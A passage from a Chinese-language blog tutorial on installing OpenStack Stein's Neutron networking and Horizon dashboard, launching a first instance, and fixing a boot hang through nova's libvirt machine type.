class="string">&#x27;neutron&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NEUTRON_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在keystone中创建账号和服务实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./admin-openrc</span><br><span class="line">openstack user create --domain default --password NEUTRON_PASS neutron</span><br><span class="line">openstack role add --project service --user neutron adminopenstack service create --name neutron \</span><br><span class="line">  --description <span class="string">&quot;OpenStack Networking&quot;</span> network</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  network public http://controller:9696</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  network internal http://controller:9696</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  network admin http://controller:9696</span><br></pre></td></tr></table></figure><p>开始安装对应包，openstack默认提供两种网络方案，一个是提供商网络还有一个是自建网络也可以看作为阿里的VPC，这里搭建采用提供商网络，相当于桥接网络。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-neutron openstack-neutron-ml2 \</span><br><span class="line">  openstack-neutron-linuxbridge ebtables</span><br></pre></td></tr></table></figure><p>下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/neutron.conf&#123;,.bak&#125;</span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/plugins/ml2/ml2_conf.ini&#123;,.bak&#125;</span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;</span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/dhcp_agent.ini&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.conf</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/plugins/ml2/ml2_conf.ini.bak &gt; /etc/neutron/plugins/ml2/ml2_conf.ini</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/dhcp_agent.ini.bak &gt; /etc/neutron/dhcp_agent.ini</span><br></pre></td></tr></table></figure><p>开始配置<code>/etc/neutron/neutron.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]                                                                          notify_nova_on_port_status_changes = true                                          notify_nova_on_port_data_changes = true                                            transport_url = rabbit://openstack:RABBIT_PASS@controller                          core_plugin = ml2                                                                  auth_strategy = keystone                                                           service_plugins =</span><br><span class="line">[database]                                                            </span><br><span class="line">connection = mysql+pymysql://neutron:NEUTRON_DBPASS@controller/neutron</span><br><span class="line">[keystone_authtoken]                                                               </span><br><span class="line">www_authenticate_uri = http://controller:5000                                      </span><br><span class="line">auth_url = http://controller:5000                                                  </span><br><span class="line">memcached_servers = controller:11211                                               </span><br><span class="line">auth_type = password                                                               </span><br><span class="line">project_domain_name = default                                                      </span><br><span class="line">user_domain_name = default                                                         </span><br><span class="line">project_name = service </span><br><span class="line">username = neutron     </span><br><span class="line">password = NEUTRON_PASS</span><br><span class="line">[oslo_concurrency]              </span><br><span class="line">lock_path = /var/lib/neutron/tmp</span><br><span class="line">[nova]                                                            </span><br><span class="line">auth_url = http://controller:5000                                 </span><br><span class="line">auth_type = password                                              </span><br><span class="line">project_domain_name = default                                     </span><br><span class="line">user_domain_name = default                                        </span><br><span class="line">region_name = RegionOne                                           </span><br><span class="line">project_name = service                                                             </span><br><span class="line">username = nova     </span><br><span class="line">password = NOVA_PASS</span><br></pre></td></tr></table></figure><p>配置<code>/etc/neutron/plugins/ml2/ml2_conf.ini</code>，这个文件时ml2模块的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[ml2]                                                                              </span><br><span class="line">type_drivers = flat,vlan                                                           </span><br><span class="line">tenant_network_types =  </span><br><span class="line">mechanism_drivers = linuxbridge                                                    </span><br><span class="line">extension_drivers = port_security                                                  </span><br><span class="line">[ml2_type_flat]</span><br><span class="line">flat_networks = provider,net_vmnet1</span><br><span class="line">[securitygroup]</span><br><span class="line">enable_ipset = true                                                           </span><br></pre></td></tr></table></figure><p>配置<code>/etc/neutron/plugins/ml2/linuxbridge_agent.ini</code>，这里是linuxbridge的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[linux_bridge]                                                                </span><br><span class="line">physical_interface_mappings = provider:ens33                </span><br><span class="line">[vxlan]                                                                       </span><br><span class="line">enable_vxlan = <span class="literal">false</span>                                                          </span><br><span class="line">[securitygroup]                                                               </span><br><span class="line">enable_security_group = <span class="literal">true</span>                                                  </span><br><span class="line">firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</span><br></pre></td></tr></table></figure><p>下面开始加载系统模块，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;br_netfilter&quot;</span> &gt;&gt; /etc/modules-load.d/bridge.conf</span><br><span class="line">modprobe br_netfilter</span><br></pre></td></tr></table></figure><p>配置sysctl,编辑<code>/etc/sysctl.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.bridge.bridge-nf-call-iptables = 1 </span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br></pre></td></tr></table></figure><p>执行<code>sysctl -p</code>重载,在配置的时候需要注意<code>physical_interface_mappings</code>文档中需要自己指定网卡名字，这里我的网卡是ens33所以指定这个，还有就是关于vxlan，因为这里是采用提供商网络，相当于桥接，不需要vxlan直接关闭，后面配置自由网络还需要开启。<br>配置<code>/etc/neutron/dhcp_agent.ini</code>，这个文件是为了dhcp的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">interface_driver = linuxbridge</span><br><span class="line">dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq</span><br><span class="line">enable_isolated_metadata = true</span><br></pre></td></tr></table></figure><p>在配置过程中可能有些官网字段不存在，直接自己加上即可。<br>此时提供商网络已经配置好，现在需要开始配置<code>neutron</code>的其他选项，下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/metadata_agent.ini&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/metadata_agent.ini.bak &gt; /etc/neutron/metadata_agent.ini</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/neutron/metadata_agent.ini</code>,修改内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">nova_metadata_host = controller</span><br><span class="line">metadata_proxy_shared_secret = METADATA_SECRET</span><br></pre></td></tr></table></figure><p>现在<code>neutron</code>已经配置完成，需要去nova控制节点去对接，编辑文件<code>/etc/nova/nova.conf</code>,修改下面内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[neutron]</span><br><span class="line">url = http://controller:9696</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">region_name = RegionOne</span><br><span class="line">project_name = service</span><br><span class="line">username = neutron</span><br><span class="line">password = NEUTRON_PASS</span><br><span class="line">service_metadata_proxy = <span class="literal">true</span></span><br><span class="line">metadata_proxy_shared_secret = METADATA_SECRET</span><br></pre></td></tr></table></figure><p>下面开始做启动neutron的工作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引用ml2模块</span></span><br><span class="line"><span class="built_in">ln</span> -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini</span><br><span class="line"><span class="comment"># 填充数据库</span></span><br><span class="line">su -s /bin/sh -c <span class="string">&quot;neutron-db-manage --config-file /etc/neutron/neutron.conf \</span></span><br><span class="line"><span class="string">  --config-file /etc/neutron/plugins/ml2/ml2_conf.ini upgrade head&quot;</span> neutron</span><br><span class="line"><span class="comment"># 重启nova控制模块</span></span><br><span class="line">systemctl restart openstack-nova-api.service</span><br><span class="line"><span class="comment"># 启动neutron的提供商网络,不同的网络方式启动方式不通,请注意官方文档</span></span><br><span class="line">systemctl <span class="built_in">enable</span> --now neutron-server.service \</span><br><span class="line">  neutron-linuxbridge-agent.service neutron-dhcp-agent.service \</span><br><span class="line">  neutron-metadata-agent.service</span><br></pre></td></tr></table></figure><p>验证配置参考： <a href="https://docs.openstack.org/neutron/stein/install/verify-option1.html">https://docs.openstack.org/neutron/stein/install/verify-option1.html</a><br>正常的验证效果应该是这样的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241230165356.png"></p><h2 id="Neutron-网络计算节点"><a href="#Neutron-网络计算节点" class="headerlink" title="Neutron - 网络计算节点"></a>Neutron - 网络计算节点</h2><p>参考文档： <a href="https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html">https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html</a><br>安装组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-neutron-linuxbridge ebtables ipset</span><br></pre></td></tr></table></figure><p>备份配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/neutron.conf&#123;,.bak&#125;</span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.conf</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span><br></pre></td></tr></table></figure><p>编辑配置<code>/etc/neutron/neutron.conf</code>主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]                                                                          transport_url = rabbit://openstack:RABBIT_PASS@controller                          auth_strategy = keystone</span><br><span class="line">[keystone_authtoken]                                                               www_authenticate_uri = http://controller:5000                                      auth_url = http://controller:5000                                                  memcached_servers = controller:11211                                               auth_type = password            </span><br><span class="line">project_domain_name = default   </span><br><span class="line">user_domain_name = default      </span><br><span class="line">project_name = service          </span><br><span class="line">username = neutron              </span><br><span class="line">password = NEUTRON_PASS</span><br><span class="line">[oslo_concurrency]              </span><br><span class="line">lock_path = /var/lib/neutron/tmp</span><br></pre></td></tr></table></figure><p>下面配置<code>ml2</code>模块，编辑<code>/etc/neutron/plugins/ml2/linuxbridge_agent.ini</code>，主要内容和控制节点的一样，直接复制也行，主要内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[linux_bridge]                                                                </span><br><span class="line">physical_interface_mappings = provider:ens33                </span><br><span class="line">[vxlan]                                                                       </span><br><span class="line">enable_vxlan = false                                                          </span><br><span class="line">[securitygroup]                                                               </span><br><span class="line">enable_security_group = true                                                  </span><br><span class="line">firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</span><br></pre></td></tr></table></figure><p>下面开始加载系统模块，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;br_netfilter&quot;</span> &gt;&gt; /etc/modules-load.d/bridge.conf</span><br><span class="line">modprobe br_netfilter</span><br></pre></td></tr></table></figure><p>配置sysctl,编辑<code>/etc/sysctl.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.bridge.bridge-nf-call-iptables = 1 </span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br></pre></td></tr></table></figure><p>执行<code>sysctl -p</code>重载<br>下面在计算节点的计算模块对接一下,编辑<code>/etc/nova/nova.conf</code>,主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[neutron]</span><br><span class="line">url = http://controller:9696</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">region_name = RegionOne</span><br><span class="line">project_name = service</span><br><span class="line">username = neutron</span><br><span class="line">password = NEUTRON_PASS</span><br></pre></td></tr></table></figure><p>重启计算节点的<code>nova</code>服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart openstack-nova-compute.service</span><br></pre></td></tr></table></figure><p>启动计算节点的<code>neutron</code>模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now neutron-linuxbridge-agent.service</span><br></pre></td></tr></table></figure><h2 id="Horizon-仪表盘服务"><a href="#Horizon-仪表盘服务" class="headerlink" title="Horizon - 仪表盘服务"></a>Horizon - 仪表盘服务</h2><p>参考文档： </p><ul><li><a href="https://docs.openstack.org/horizon/stein/install/">https://docs.openstack.org/horizon/stein/install/</a></li><li><a href="https://docs.openstack.org/horizon/stein/install/install-rdo.html">https://docs.openstack.org/horizon/stein/install/install-rdo.html</a><br>这里把仪表盘安装在控制节点中，执行下面命令安装软件包</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-dashboard</span><br></pre></td></tr></table></figure><p>这里备份一下配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/openstack-dashboard/local_settings ~/</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/openstack-dashboard/local_settings</code>,主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 设置主机名</span><br><span class="line">OPENSTACK_HOST = &quot;controller&quot;</span><br><span class="line"># 这里是设置允许访问的主机名，*代表全部</span><br><span class="line">ALLOWED_HOSTS = [&#x27;*&#x27;]</span><br><span class="line"># 会话存储引擎指定</span><br><span class="line">SESSION_ENGINE = &#x27;django.contrib.sessions.backends.cache&#x27;</span><br><span class="line"># 缓存配置</span><br><span class="line">CACHES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">         &#x27;BACKEND&#x27;: &#x27;django.core.cache.backends.memcached.MemcachedCache&#x27;,</span><br><span class="line">         &#x27;LOCATION&#x27;: &#x27;controller:11211&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># **Keystone** 服务的 URL</span><br><span class="line">OPENSTACK_KEYSTONE_URL = &quot;http://%s:5000/v3&quot; % OPENSTACK_HOST</span><br><span class="line"># 启用 Keystone 多域支持</span><br><span class="line">OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True</span><br><span class="line"># 定义 OpenStack 服务的 API 版本</span><br><span class="line">OPENSTACK_API_VERSIONS = &#123;</span><br><span class="line">    &quot;identity&quot;: 3,</span><br><span class="line">    &quot;image&quot;: 2,</span><br><span class="line">    &quot;volume&quot;: 3,</span><br><span class="line">&#125;</span><br><span class="line"># 这是 Keystone 服务的配置项，指定默认的域名。</span><br><span class="line">OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = &quot;Default&quot;</span><br><span class="line"># 新增用户的默认角色(ROLE)</span><br><span class="line">OPENSTACK_KEYSTONE_DEFAULT_ROLE = &quot;user&quot;</span><br><span class="line"># Neutron 网络服务的设置</span><br><span class="line">OPENSTACK_NEUTRON_NETWORK = &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;enable_router&#x27;: False,</span><br><span class="line">    &#x27;enable_quotas&#x27;: False,</span><br><span class="line">    &#x27;enable_distributed_router&#x27;: False,</span><br><span class="line">    &#x27;enable_ha_router&#x27;: False,</span><br><span class="line">    &#x27;enable_lb&#x27;: False,</span><br><span class="line">    &#x27;enable_firewall&#x27;: False,</span><br><span class="line">    &#x27;enable_vpn&#x27;: False,</span><br><span class="line">    &#x27;enable_fip_topology_check&#x27;: False,</span><br><span class="line">&#125;</span><br><span class="line"># 设置时区</span><br><span class="line">TIME_ZONE = &quot;Asia/Shanghai&quot;</span><br></pre></td></tr></table></figure><p>之后再去编辑<code>/etc/httpd/conf.d/openstack-dashboard.conf</code>,添加下面内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WSGIApplicationGroup %&#123;GLOBAL&#125;</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd.service memcached.service</span><br></pre></td></tr></table></figure><p>访问<code>http://10.0.0.11/dashboard</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241230190756.png"><br>默认域<code>default</code><br>用户名:<code>admin</code><br>密码: <code>ADMIN_PASS</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241230190912.png"></p><h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考文档： </p><ul><li><a href="https://docs.openstack.org/install-guide/launch-instance.html">https://docs.openstack.org/install-guide/launch-instance.html</a></li><li><a href="https://docs.openstack.org/install-guide/launch-instance-networks-provider.html">https://docs.openstack.org/install-guide/launch-instance-networks-provider.html</a><br>这里的使用都是用命令行去创建的，自己也可以通过仪表盘去创建</li></ul><h2 id="创建网络"><a href="#创建网络" class="headerlink" title="创建网络"></a>创建网络</h2><p>创建实例前，应该先创建一个网络，可以参考命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openstack network create  --share --external \</span><br><span class="line">  --provider-physical-network provider \</span><br><span class="line">  --provider-network-type flat provider</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104140717.png"><br>参数具体含义如下</p><ul><li><p><strong><code>openstack network create</code></strong>：</p><ul><li>创建一个新的网络。</li></ul></li><li><p><strong><code>--share</code></strong>：</p><ul><li>使网络成为共享的网络，意味着其他租户（project）也可以使用该网络。</li></ul></li><li><p><strong><code>--external</code></strong>：</p><ul><li>标记该网络为外部网络，通常指该网络连接到物理网络或者外部互联网。这通常用于提供公网访问。</li></ul></li><li><p><strong><code>--provider-physical-network provider</code></strong>：</p><ul><li>指定物理网络名称为 <code>provider</code>。这个物理网络是指在网络拓扑中与 OpenStack 的虚拟网络连接的物理网络接口。</li></ul></li><li><p><strong><code>--provider-network-type flat</code></strong>：</p><ul><li>指定网络类型为 <code>flat</code>，表示不使用 VLAN 或者其他网络隔离机制，所有主机之间都在同一个网络中，通常用于简单的网络环境。</li></ul></li><li><p><strong><code>provider</code></strong>：</p><ul><li>这是创建的网络名称。在这个命令中，创建的网络名称是 <code>provider</code>，它是外部共享网络</li></ul></li></ul><p>其中<code>provider</code>是在neutron的ml2模块中指定的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[ml2]</span><br><span class="line">flat_networks = provider                      </span><br><span class="line">```                                     </span><br><span class="line">之后开始创建子网，执行下面命令创建一个子网</span><br><span class="line">```bash</span><br><span class="line">openstack subnet create --network provider \</span><br><span class="line">  --allocation-pool start=START_IP_ADDRESS,end=END_IP_ADDRESS \</span><br><span class="line">  --dns-nameserver DNS_RESOLVER --gateway PROVIDER_NETWORK_GATEWAY \</span><br><span class="line">  --subnet-range PROVIDER_NETWORK_CIDR provider</span><br></pre></td></tr></table></figure><p>注意替换上面相关的参数，这里我替换后的命令是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openstack subnet create --network provider \</span><br><span class="line">  --allocation-pool start=10.0.0.200,end=10.0.0.210 \</span><br><span class="line">  --dns-nameserver 114.114.114.114 --gateway 10.0.0.2 \</span><br><span class="line">  --subnet-range 10.0.0.0/24 provider</span><br></pre></td></tr></table></figure><p>要注意的是，因为搭建的时候采用的是供应商网络，相当于直连，想要上网网段需要和虚机网络一样，网关使用虚机的网关。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104152819.png"></p><h2 id="创建规格"><a href="#创建规格" class="headerlink" title="创建规格"></a>创建规格</h2><p>下面开始创建规格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openstack flavor create --<span class="built_in">id</span> 0 --vcpus 1 --ram 64 --disk 1 m1.nano</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104141706.png"><br>创建一个id为0,cpu数量为1,内存为64,存储为1GB,名字为m1.nano的实例规格</p><h2 id="创建SSH密钥对"><a href="#创建SSH密钥对" class="headerlink" title="创建SSH密钥对"></a>创建SSH密钥对</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建密钥对</span></span><br><span class="line">ssh-keygen -q -N <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 导入密钥对</span></span><br><span class="line">openstack keypair create --public-key ~/.ssh/id_rsa.pub mykey</span><br></pre></td></tr></table></figure><h2 id="安全组规则"><a href="#安全组规则" class="headerlink" title="安全组规则"></a>安全组规则</h2><p>给默认安全组放行icmp协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openstack security group rule create --proto icmp default</span><br></pre></td></tr></table></figure><p>放行SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openstack security group rule create --proto tcp --dst-port 22 default</span><br></pre></td></tr></table></figure><p>添加安全组规则的原因是因为默认的安全组是一切都拒绝的。</p><h2 id="创建主机"><a href="#创建主机" class="headerlink" title="创建主机"></a>创建主机</h2><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104142612.png"><br>去网页中创建主机。成功运行即成功。</p><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="启动引导卡在Booting-from-Hard-Disk…"><a href="#启动引导卡在Booting-from-Hard-Disk…" class="headerlink" title="启动引导卡在Booting from Hard Disk…"></a>启动引导卡在Booting from Hard Disk…</h2><p>实例创建好之后进入控制台会出现一直卡在Booting from Hard Disk这一步，这个似乎是因为nova默认设置的主板型号和实际运行的不兼容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104143641.png"><br>具体的解决办法是修改nova计算节点的配置文件<code>/etc/nova/nova.conf</code>，修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># libvirt 段增加</span><br><span class="line">[libvirt]</span><br><span class="line">hw_machine_type=x86_64=pc-i440fx-rhel7.2.0</span><br></pre></td></tr></table></figure><p>x86_64类型不多说，后面的这个内容是没有问题的型号，因为刚才创建了一台Test主机，可以看一下他的默认型号，他默认使7.6.<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104144150.png"><br>修改之后重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart libvirtd openstack-nova-compute</span><br></pre></td></tr></table></figure><p>重启服务之后重启实例(硬重启)，此时就没问题了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104144706.png"></p><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250104145203.png"><br>账号是：cirros<br>密码：gocubsgo</p><h2 id="供应商网络配置子网没有网络"><a href="#供应商网络配置子网没有网络" class="headerlink" title="供应商网络配置子网没有网络"></a>供应商网络配置子网没有网络</h2><p>要注意的是，因为搭建的时候采用的是供应商网络，相当于直连，想要上网网段需要和虚机网络一样，网关使用虚机的网关。使用其他的自定义的网络是不可以上网的。</p>]]></content>
    
    
    <summary type="html">版本选择
Open stack的版本是从A-Z之后的版本似乎是通过年月日来命名的，目前最新版本为2025.1-dev

